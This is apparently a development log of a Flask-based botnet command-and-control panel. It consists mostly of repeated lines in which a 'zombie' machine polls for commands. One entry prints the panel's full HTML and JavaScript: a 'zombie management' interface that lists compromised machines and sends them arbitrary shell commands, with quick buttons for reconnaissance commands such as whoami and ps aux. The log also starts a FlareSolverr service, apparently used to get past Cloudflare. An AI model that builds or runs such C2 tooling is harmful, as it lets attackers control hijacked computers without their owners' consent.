2025-06-25 00:12:30 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:12:30] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:12:31 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:12:31 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:12:31 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0013s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:12:31 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:12:31] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:12:32 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:12:32 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:12:32 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:12:32 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:12:32] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:12:33 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:12:33 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:12:33 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:12:33 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:12:33] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:12:34 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:12:34 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:12:34 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:12:34 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:12:34] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:12:35 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:12:35 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:12:35 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0016s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:12:35 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:12:35] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:12:36 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:12:36 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:12:36 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:12:36 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:12:36] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:12:37 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:12:37 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:12:37 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:12:37 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:12:37] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:12:38 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:12:38 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:12:38 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:12:38 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:12:38] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:12:39 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:12:39 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:12:39 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:12:39 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:12:39] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:12:40 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:12:40 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:12:40 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0068s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:12:40 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:12:40] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:12:41 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:12:41 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:12:41 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:12:41 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:12:41] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:12:42 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:12:42 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:12:42 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:12:42 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:12:42] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:12:43 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:12:43 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:12:43 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0016s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:12:43 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:12:43] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:12:44 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:12:44 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:12:44 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:12:44 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:12:44] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:12:45 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:12:45 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:12:45 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:12:45 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:12:45] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:12:46 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:12:46 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:12:46 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:12:46 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:12:46] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:12:47 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:12:47 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:12:47 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:12:47 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:12:47] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:12:48 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:12:48 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:12:48 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:12:48 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:12:48] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:12:49 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:12:49 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:12:49 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:12:49 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:12:49] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:12:50 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:12:50 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:12:50 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:12:50 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:12:50] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:12:51 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:12:51 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:12:51 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0013s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:12:51 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:12:51] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:13:01 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-25 00:13:01 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-25 00:13:01 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-25 00:13:01 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-25 00:13:01 | INFO     | app.py:197 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-25 00:13:01 | INFO     | app.py:197 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-25 00:13:01 | INFO     | app.py:211 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-25 00:13:01 | INFO     | app.py:211 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-25 00:13:01 | INFO     | start_flaresolverr.py:59 | start_flaresolverr() | FlareSolverr 已經在運行
2025-06-25 00:13:01 | INFO     | app.py:214 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-25 00:13:01 | INFO     | app.py:214 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-25 00:13:01 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-25 00:13:01 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-25 00:13:01 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-25 00:13:01 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-25 00:13:01 | INFO     | app.py:197 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-25 00:13:01 | INFO     | app.py:197 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-25 00:13:01 | INFO     | app.py:211 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-25 00:13:01 | INFO     | app.py:211 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-25 00:13:01 | INFO     | start_flaresolverr.py:59 | start_flaresolverr() | FlareSolverr 已經在運行
2025-06-25 00:13:01 | INFO     | app.py:214 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-25 00:13:01 | INFO     | app.py:214 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-25 00:13:01 | INFO     | _internal.py:97 | _log() | [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:8964
2025-06-25 00:13:01 | INFO     | _internal.py:97 | _log() | [33mPress CTRL+C to quit[0m
2025-06-25 00:13:02 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:13:02 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:13:02 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0219s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:13:02 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:13:02] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:13:03 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:13:03 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:13:03 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:13:03 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:13:03] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:13:04 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:13:04 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:13:04 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:13:04 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:13:04] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:13:05 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:13:05 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:13:05 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0015s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:13:05 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:13:05] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:13:06 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:13:06 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:13:06 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.1281s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:13:06 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:13:06] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:13:07 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:13:07 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:13:07 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:13:07 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:13:07] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:13:07 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_messages()
2025-06-25 00:13:07 | INFO     | control_route.py:81 | get_messages() | 用戶請求獲取消息
2025-06-25 00:13:07 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_messages 執行完畢 (耗時: 0.0126s) -> 回傳: '<!DOCTYPE html>\n<html lang="zh-TW">\n    \n    <head>\n        <meta charset="UTF-8">\n        <meta name="viewport" content="width=device-width, initial-scale=1.0">\n        <title>控制消息</title>\n        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">\n        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n        \n    </head>\n    <body>\n        <!-- 导航栏 -->\n        <nav class="navbar navbar-expand-lg navbar-dark bg-primary">\n            <div class="container">\n                <a class="navbar-brand" href="/">\n                    <i class="fas fa-shield-alt"></i> 扫描目标管理系统\n                </a>\n                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">\n                    <span class="navbar-toggler-icon"></span>\n                </button>\n                <div class="collapse navbar-collapse" id="navbarNav">\n                    <ul class="navbar-nav ms-auto">\n                        <li class="nav-item">\n                            <a class="nav-link" href="/">\n                                <i class="fas fa-home"></i> 目标列表\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/add_target">\n                                <i class="fas fa-plus"></i> 添加目标\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/api/control/get_messages">\n                                <i class="fas fa-cog"></i> 控制消息\n                            </a>\n                        </li>\n                    </ul>\n                </div>\n            </div>\n        </nav>\n\n        \n        \n        \n\n        \n<div class="container">\n    <!-- Flash 消息區域 -->\n    \n    \n    \n\n    <!-- 選項卡導航 -->\n    <div class="tab-navigation">\n        <button class="tab-btn active" onclick="showTab(\'messages\')">📨 控制消息</button>\n        <button class="tab-btn" onclick="showTab(\'zombies\')">🧟 殭屍管理</button>\n    </div>\n\n    <!-- 控制消息選項卡 -->\n    <div id="messages-tab" class="tab-content active">\n        <h2>控制消息</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">透過此面板管理和監控您的C2控制消息</p>\n        <form method="post" action="/api/control/add_message">\n            <div class="form-group">\n                <label class="form-label" for="message">控制消息</label>\n                <input type="text" id="message" name="message" placeholder="輸入要發送的控制消息" required>\n            </div>\n            <div class="form-group">\n                <label class="form-label" for="target_ip">目標IP地址</label>\n                <input type="text" id="target_ip" name="target_ip" placeholder="輸入目標IP地址（可選）">\n            </div>\n            <button type="submit">發送消息</button>\n        </form>\n    </div>\n\n    <!-- 殭屍管理選項卡 -->\n    <div id="zombies-tab" class="tab-content">\n        <h2>殭屍機器管理</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">管理已連接的殭屍機器並發送命令</p>\n\n        <!-- 殭屍機器列表 -->\n        <div class="zombie-controls">\n            <button id="refresh-zombies" class="refresh-btn">🔄 刷新殭屍列表</button>\n            <div id="zombie-count" class="zombie-count">載入中...</div>\n        </div>\n\n        <div id="zombie-list" class="zombie-list">\n            <!-- 殭屍機器將通過JavaScript動態載入 -->\n        </div>\n\n        <!-- 命令發送表單 -->\n        <div class="command-form-container" style="display: none;" id="command-form-container">\n            <h3>發送命令給殭屍機器</h3>\n            <form id="command-form">\n                <div class="form-group">\n                    <label class="form-label" for="selected-zombie">選中的殭屍機器</label>\n                    <input type="text" id="selected-zombie" readonly>\n                </div>\n                <div class="form-group">\n                    <label class="form-label" for="command">執行命令</label>\n                    <input type="text" id="command" name="command" placeholder="輸入要執行的命令" required>\n                </div>\n                <div class="form-group">\n                    <label class="form-label">常用命令</label>\n                    <div class="quick-commands">\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'whoami\')">whoami</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'pwd\')">pwd</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ls -la\')">ls -la</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ps aux\')">ps aux</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'netstat -tuln\')">netstat</button>\n                    </div>\n                </div>\n                <button type="submit">💀 發送命令</button>\n                <button type="button" onclick="hideCommandForm()">取消</button>\n            </form>\n        </div>\n    </div>\n    <div style="display: flex; justify-content: space-between; align-items: center; margin: 40px 0 20px 0;">\n        <h1 style="margin: 0;">已經知道的消息列表</h1>\n        <a href="/api/control/help" class="help-btn">📚 查看使用說明</a>\n    </div>\n    <div id="messageList">\n        \n        <div class="empty-state">\n            目前沒有任何消息\n        </div>\n        \n    </div>\n</div>\n<link rel="stylesheet" href="/static/css/control_message.css">\n\n<script>\n    // 選項卡切換功能\n    function showTab(tabName) {\n        // 隱藏所有選項卡內容\n        const tabContents = document.querySelectorAll(\'.tab-content\');\n        tabContents.forEach(tab => {\n            tab.classList.remove(\'active\');\n        });\n\n        // 移除所有選項卡按鈕的活動狀態\n        const tabBtns = document.querySelectorAll(\'.tab-btn\');\n        tabBtns.forEach(btn => {\n            btn.classList.remove(\'active\');\n        });\n\n        // 顯示選中的選項卡\n        document.getElementById(tabName + \'-tab\').classList.add(\'active\');\n        event.target.classList.add(\'active\');\n\n        // 如果切換到殭屍管理選項卡，自動載入殭屍列表\n        if (tabName === \'zombies\') {\n            loadZombies();\n        }\n    }\n\n    // 載入殭屍機器列表\n    async function loadZombies() {\n        try {\n            const response = await fetch(\'/api/control/get_zombies\');\n            const data = await response.json();\n\n            const zombieCountEl = document.getElementById(\'zombie-count\');\n            const zombieListEl = document.getElementById(\'zombie-list\');\n\n            if (data.status === \'success\') {\n                zombieCountEl.textContent = `找到 ${data.count} 台殭屍機器`;\n\n                if (data.zombies.length === 0) {\n                    zombieListEl.innerHTML = \'<div class="empty-state">目前沒有連接的殭屍機器</div>\';\n                } else {\n                    let zombieHtml = \'\';\n                    data.zombies.forEach(zombie => {\n                        zombieHtml += `\n                        <div class="zombie-card" onclick="selectZombie(\'${zombie}\')">\n                            <div class="zombie-info">\n                                <h4>🧟 ${zombie}</h4>\n                                <p>點擊選擇此殭屍機器</p>\n                            </div>\n                            <div class="zombie-actions">\n                                <button class="action-btn" onclick="event.stopPropagation(); selectZombie(\'${zombie}\')">\n                                    💀 發送命令\n                                </button>\n                            </div>\n                        </div>\n                    `;\n                    });\n                    zombieListEl.innerHTML = zombieHtml;\n                }\n            } else {\n                zombieCountEl.textContent = \'載入失敗\';\n                zombieListEl.innerHTML = `<div class="error-state">載入失敗: ${data.error}</div>`;\n            }\n        } catch (error) {\n            console.error(\'載入殭屍列表失敗:\', error);\n            document.getElementById(\'zombie-count\').textContent = \'載入失敗\';\n            document.getElementById(\'zombie-list\').innerHTML = \'<div class="error-state">網路錯誤</div>\';\n        }\n    }\n\n    // 選擇殭屍機器\n    function selectZombie(zombieIp) {\n        document.getElementById(\'selected-zombie\').value = zombieIp;\n        document.getElementById(\'command-form-container\').style.display = \'block\';\n        document.getElementById(\'command\').focus();\n    }\n\n    // 隱藏命令表單\n    function hideCommandForm() {\n        document.getElementById(\'command-form-container\').style.display = \'none\';\n        document.getElementById(\'command\').value = \'\';\n        document.getElementById(\'selected-zombie\').value = \'\';\n    }\n\n    // 設置快速命令\n    function setCommand(cmd) {\n        document.getElementById(\'command\').value = cmd;\n    }\n\n    // 發送命令給殭屍機器\n    document.getElementById(\'command-form\').addEventListener(\'submit\', async function (e) {\n        e.preventDefault();\n\n        const zombieIp = document.getElementById(\'selected-zombie\').value;\n        const command = document.getElementById(\'command\').value;\n\n        if (!zombieIp || !command) {\n            alert(\'請選擇殭屍機器並輸入命令\');\n            return;\n        }\n\n        try {\n            const formData = new FormData();\n            formData.append(\'command\', command);\n\n            const response = await fetch(`/api/control/add_command_to_do/${zombieIp}`, {\n                method: \'POST\',\n                body: formData\n            });\n\n            if (response.ok) {\n                alert(`命令已發送給 ${zombieIp}`);\n                hideCommandForm();\n            } else {\n                const errorData = await response.json();\n                alert(`發送失敗: ${errorData.error}`);\n            }\n        } catch (error) {\n            console.error(\'發送命令失敗:\', error);\n            alert(\'發送命令時發生網路錯誤\');\n        }\n    });\n\n    // 刷新殭屍列表\n    document.getElementById(\'refresh-zombies\').addEventListener(\'click\', loadZombies);\n\n    // 頁面載入時檢查當前選項卡\n    document.addEventListener(\'DOMContentLoaded\', function () {\n        // 檢查URL參數是否指定了選項卡\n        const urlParams = new URLSearchParams(window.location.search);\n        const tab = urlParams.get(\'tab\');\n        if (tab === \'zombies\') {\n            showTab(\'zombies\');\n        }\n    });\n</script>\n\n\n\n        <!-- JavaScript 引用 -->\n        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>\n        \n    </body>\n    \n</html>'
2025-06-25 00:13:07 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:13:07] "GET /api/control/get_messages HTTP/1.1" 200 -
2025-06-25 00:13:08 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:13:08] "GET /static/css/control_message.css HTTP/1.1" 200 -
2025-06-25 00:13:08 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:13:08] "[33mGET /.well-known/appspecific/com.chrome.devtools.json HTTP/1.1[0m" 404 -
2025-06-25 00:13:08 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:13:08] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-25 00:13:08 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:13:08 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:13:08 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:13:08 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:13:08] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:13:09 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:13:09 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:13:09 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:13:09 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:13:09] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:13:10 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:13:10 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:13:10 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:13:10 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:13:10] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:13:11 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:13:11 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
